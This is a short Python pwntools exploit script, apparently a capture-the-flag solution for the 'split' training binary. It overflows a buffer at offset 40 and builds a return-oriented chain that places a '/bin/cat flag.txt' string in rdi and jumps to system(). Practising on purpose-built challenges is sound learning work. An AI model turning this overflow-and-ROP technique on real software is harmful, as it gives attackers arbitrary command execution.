import time

from pwn import *


EXECUTABLE = "./split"
context.binary = elf = ELF(EXECUTABLE)

p = process(EXECUTABLE)


OFFSET = 40
if OFFSET is None:
    p.sendafter(b"> ", cyclic(128))

    time.sleep(1)
    core = Coredump("./core")
    seg_addr = int("0x" + hex(core.fault_addr)[10:], 16)
    log.success(f"Core fault address at: {hex(core.fault_addr)}")
    log.info(f"Finding offset for {hex(seg_addr)}")
    offset = cyclic_find(seg_addr)
    log.success(f"Offset found: {offset}")
    exit()

rop = ROP(elf)

payload  = b"A" * OFFSET
# Load string "/bin/cat flag.txt" into rdi
payload += p64(rop.rdi.address) + p64(0x00601060)
# Jump to `call system` in usefulFunction
payload += p64(elf.symbols["usefulFunction"] + 9)

p.sendafter(b"> ", payload)
p.recv()

flag = str(p.recv(), "UTF-8")
log.success(f"Flag: {flag}")
